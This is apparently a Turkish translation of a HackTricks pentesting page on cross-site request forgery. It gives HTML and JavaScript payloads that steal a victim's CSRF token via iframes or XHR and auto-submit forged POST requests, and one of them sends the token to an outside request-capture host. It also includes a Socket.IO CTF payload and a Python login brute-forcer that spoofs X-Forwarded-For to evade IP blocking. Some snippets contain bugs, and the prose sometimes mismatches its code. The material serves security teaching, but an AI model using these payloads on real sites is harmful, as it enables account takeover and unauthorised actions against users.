### **CSRF Token'ı Çalma ve Bir iframe ve Form Kullanarak POST İsteği Gönderme**

Bir saldırgan, hedef web uygulamasında bir Cross-Site Request Forgery (CSRF) saldırısı gerçekleştirmek için hedef kullanıcının CSRF token'ını çalmak ve bir iframe ve form kullanarak POST isteği göndermek isteyebilir.

Bu saldırıyı gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:

1. Saldırgan, hedef web uygulamasını analiz ederek CSRF token'ını nasıl alabileceğini belirler.
2. Saldırgan, hedef kullanıcıyı kandırmak için bir kötü niyetli web sitesi oluşturur ve bu web sitesinde bir iframe ve form ekler.
3. İframe, hedef web uygulamasının hedef sayfasını içerecek şekilde yapılandırılır.
4. Form, hedef web uygulamasına POST isteği göndermek için gerekli alanları içerir. Bu formda, hedef sayfada kullanılan CSRF token'ı da dahil edilir.
5. Saldırgan, hedef kullanıcıyı kötü niyetli web sitesine yönlendirir.
6. Kötü niyetli web sitesi, iframe aracılığıyla hedef sayfayı yükler ve formu otomatik olarak gönderir.
7. Hedef kullanıcı, kötü niyetli web sitesini ziyaret ettiğinde, form otomatik olarak gönderildiği için CSRF token'ı da dahil edilerek hedef web uygulamasına istek gönderilir.
8. Hedef web uygulaması, isteği doğru kabul eder ve saldırganın istediği eylemi gerçekleştirir.

Bu saldırı, hedef kullanıcının güvenilir bir web sitesine giriş yapmışken bile gerçekleştirilebilir. Bu nedenle, web uygulamalarının CSRF saldırılarına karşı korunması için CSRF token'larının doğru bir şekilde uygulanması önemlidir.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Token çalmak ve 2 iframe kullanarak göndermek**

Bir Cross-Site Request Forgery (CSRF) saldırısı sırasında, hedef kullanıcının tarayıcısında oturum açıkken, saldırgan hedefin yetkilendirme token'ını çalmak ve başka bir istekte kullanmak isteyebilir. Bu saldırıyı gerçekleştirmek için, saldırgan iki iframe kullanır: birincisi, hedefin oturum açtığı web sitesini içerir ve ikincisi, token'ı saldırgana göndermek için kullanılır.

İşlem adımları şunlardır:

1. Saldırgan, hedefin oturum açtığı web sitesini içeren bir iframe oluşturur.
2. İkinci bir iframe oluşturulur ve bu iframe, saldırganın kontrolündeki bir web sitesini içerir.
3. İkinci iframe, hedefin yetkilendirme token'ını çalmak için JavaScript kullanır. Bu, token'ı saldırganın kontrolündeki web sitesine gönderir.
4. Saldırgan, çalınan token'ı kullanarak hedefin adına yetkilendirilmiş bir istek yapabilir.

Bu saldırı, hedef kullanıcının tarayıcısında oturum açıkken gerçekleştirildiğinden, hedefin güvenilir bir web sitesinde oturum açıkken dikkatli olması önemlidir. Ayrıca, web uygulamalarının CSRF saldırılarına karşı korunmak için doğru önlemleri alması gerekmektedir.
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajax ile CSRF belirteci çalma ve bir form ile post gönderme**

Bir saldırgan, hedef web uygulamasında bir CSRF belirteci çalmak ve ardından bu belirteci kullanarak bir post isteği göndermek için Ajax kullanabilir. Bu saldırı tekniği, saldırganın hedef kullanıcının kimlik doğrulamasını kullanarak yetkilendirilmiş işlemleri gerçekleştirmesine olanak tanır.

Saldırgan, hedef web uygulamasında bir form oluşturur ve bu formu hedef kullanıcıya sunar. Form, hedef web uygulamasının CSRF korumasını aşmak için bir CSRF belirteci içerir. Saldırgan, Ajax kullanarak bu formu otomatik olarak gönderir ve hedef web uygulamasına yetkilendirilmiş bir post isteği yapar.

Bu saldırı tekniği, hedef kullanıcının tarayıcısında oturum açıkken gerçekleştirildiğinde etkilidir. Saldırgan, hedef kullanıcının tarayıcısında bir JavaScript kodu çalıştırarak Ajax isteğini otomatik olarak gönderir. Bu sayede, hedef kullanıcının bilgisi olmadan yetkilendirilmiş bir işlem gerçekleştirilebilir.

Bu saldırıyı önlemek için web uygulamaları, CSRF koruması sağlamalıdır. Bu koruma, her post isteği için benzersiz bir CSRF belirteci oluşturarak ve bu belirteci formda veya başlıkta kullanarak gerçekleştirilebilir. Ayrıca, web uygulamaları, oturum açıkken yetkilendirilmiş işlemleri gerçekleştirmek için ek doğrulama adımları da uygulamalıdır.
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IO ile CSRF

Socket.IO, gerçek zamanlı iletişim sağlamak için kullanılan bir JavaScript kütüphanesidir. CSRF (Cross-Site Request Forgery) saldırısı, bir kullanıcının istemeden veya farkında olmadan yetkisiz bir şekilde bir işlem gerçekleştirmesini sağlayan bir saldırı türüdür. Socket.IO kullanırken, CSRF saldırılarına karşı önlem almak önemlidir.

Socket.IO ile CSRF saldırılarına karşı korunmak için aşağıdaki adımları izleyebilirsiniz:

1. **CSRF Token** kullanın: Socket.IO sunucusunda, her istek için benzersiz bir CSRF token oluşturun ve bu token'ı istemciye gönderin. İstemci, her istek yaparken bu token'ı sunucuya geri göndermelidir. Sunucu, token'ı doğrulayarak isteği kabul eder veya reddeder.

2. **Referer Kontrolü**: Sunucu tarafında, gelen isteklerin referer bilgisini kontrol edin. Referer bilgisi, isteğin kaynak sayfasını belirtir. Sadece belirli bir kaynaktan gelen istekleri kabul etmek, CSRF saldırılarını engellemeye yardımcı olabilir.

3. **Origin Kontrolü**: Sunucu tarafında, gelen isteklerin origin bilgisini kontrol edin. Origin bilgisi, isteğin kaynak URL'sini belirtir. Sadece belirli bir origin'den gelen istekleri kabul etmek, CSRF saldırılarını engellemeye yardımcı olabilir.

4. **HTTP Only ve Secure Flag'leri**: Çerezlerinizi HTTP Only ve Secure flag'leriyle ayarlayın. HTTP Only flag'i, çerezin sadece HTTP istekleriyle erişilebilir olmasını sağlar. Secure flag'i ise çerezin sadece güvenli (HTTPS) bağlantılarla iletilmesini sağlar. Bu, çerezlerin kötü niyetli kodlar tarafından çalınmasını engellemeye yardımcı olur.

Socket.IO kullanırken, bu önlemleri alarak CSRF saldırılarına karşı daha güvenli bir uygulama geliştirebilirsiniz.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Giriş Brute Force

Kod, bir CSRF belirteci kullanarak bir giriş formunu Brut Force saldırısı için kullanılabilir (Ayrıca olası bir IP karalama listesini atlatmaya çalışmak için X-Forwarded-For başlığını da kullanıyor):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Araçlar <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Referanslar

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking Insights**\
Hacking'in heyecanını ve zorluklarını inceleyen içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avcılıklarını ve önemli platform güncellemelerini takip edin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katılın ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın veya** Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ve** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github depolarına PR göndererek paylaşın.**

</details>
